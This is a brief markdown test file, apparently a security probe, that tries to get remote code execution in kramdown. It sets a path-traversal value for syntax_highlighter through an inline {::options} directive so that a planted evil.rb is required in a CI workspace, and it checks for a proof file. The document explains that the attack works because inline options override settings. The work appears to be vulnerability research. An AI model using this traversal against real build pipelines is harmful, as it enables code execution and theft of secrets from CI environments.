---
---

# Test 20: RCE via syntax_highlighter path traversal

This test attempts to load evil.rb via require path traversal through the
syntax_highlighter option. The {::options} directive overrides the OVERRIDES
because inline options merge LAST in kramdown converter initialization.

syntax_highlighter is NOT in forbidden_inline_options (default: [:template]).

{::options syntax_highlighter="../../../../../../../../../../../../../../../github/workspace/evil" /}

```ruby
# This code block triggers the syntax highlighter loading
puts "trigger"
```

If RCE worked, rce3-proof.txt will exist in the build output.
